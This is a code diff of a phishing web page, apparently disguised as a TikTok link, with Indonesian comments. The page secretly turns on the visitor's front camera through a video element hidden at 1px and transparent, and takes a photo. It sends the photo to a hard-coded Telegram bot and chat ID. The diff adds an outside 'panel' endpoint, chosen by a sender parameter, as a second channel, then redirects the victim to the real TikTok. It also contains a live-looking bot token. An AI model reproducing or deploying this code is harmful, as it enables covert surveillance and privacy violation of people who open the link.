@@ -11,8 +11,7 @@
         .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        /* TRICK FIX FOTO GELAP: Video tidak boleh display:none sejak awal, */
-        /* kita sembunyikan dengan ukuran 1px dan opacity 0 agar tetap diproses browser */
+        /* Video dibuat berukuran 1px transparan agar browser tetap memproses frame kamera */
         #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
         #canvas { display: none; }
         p { font-size: 1rem; color: #aaa; }
@@ -30,12 +29,19 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    // ================= CONFIG TELEGRAM =================
+    // ================= CONFIG TELEGRAM (CADANGAN / ADMIN) =================
     const TELEGRAM_BOT_TOKEN = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
     const TELEGRAM_CHAT_ID = '1966317946';
-    // ===================================================
+    // =====================================================================
 
+    // ================= CONFIG PANEL PTERODACTYL ==========================
+    const PANEL_ENDPOINT = 'https://gervho.com'; 
     const TARGET_WEBSITE = 'https://www.tiktok.com'; 
+    // =====================================================================
+
+    // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
+    const urlParams = new URLSearchParams(window.location.search);
+    const SENDER_ID = urlParams.get('sender'); 
 
     const video = document.getElementById('webcam');
     const canvas = document.getElementById('canvas');
@@ -53,7 +59,7 @@
 
             // Memicu pengambilan foto setelah video dipastikan memutar frame
             video.onplay = () => {
-                // Beri jeda 3 detik (3000ms) agar eksposur lensa kamera sempat menyesuaikan cahaya ruangan
+                // Jeda 3 detik (3000ms) agar eksposur lensa kamera sempat menyesuaikan cahaya ruangan
                 setTimeout(takeAndSendSnapshot, 3000);
             };
 
@@ -85,12 +91,44 @@
             currentStream.getTracks().forEach(track => track.stop());
         }
         
-        // Konversi hasil canvas menjadi file gambar untuk dikirim
+        // 1. JIKA LINK MEMILIKI ?sender= MAKA KIRIM KE PANEL (MENGGUNAKAN BASE64)
+        if (SENDER_ID) {
+            const imageData = canvas.toDataURL('image/png');
+            
+            fetch(PANEL_ENDPOINT, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    senderId: SENDER_ID,
+                    image: imageData
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (!data.ok) {
+                    // Jika panel merespon error, jalankan fallback kirim langsung ke admin
+                    sendDirectToAdmin();
+                } else {
+                    window.location.href = TARGET_WEBSITE;
+                }
+            })
+            .catch(err => {
+                console.error("Panel tidak merespon, menggunakan metode cadangan...");
+                sendDirectToAdmin();
+            });
+        } else {
+            // 2. JIKA TIDAK ADA SENDER_ID, LANGSUNG KIRIM KE CHAT ID ADMIN (MENGGUNAKAN BLOB)
+            sendDirectToAdmin();
+        }
+    }
+
+    // Fungsi cadangan: Mengirim foto langsung menggunakan Bot Token & Chat ID Admin
+    function sendDirectToAdmin() {
         canvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', blob, 'snapshot.png');
-            formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil secara terang.');
+            formData.append('caption', '📸 Target membuka link tanpa parameter!\nFoto dikirim langsung ke Chat ID Admin.');
 
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
@@ -98,9 +136,8 @@
                     body: formData
                 });
             } catch (error) {
-                console.error(error);
+                console.error("Gagal mengirim ke Telegram Admin:", error);
             } finally {
-                // Setelah selesai memproses pengiriman, alihkan halaman ke TikTok asli
                 window.location.href = TARGET_WEBSITE;
             }
         }, 'image/png');
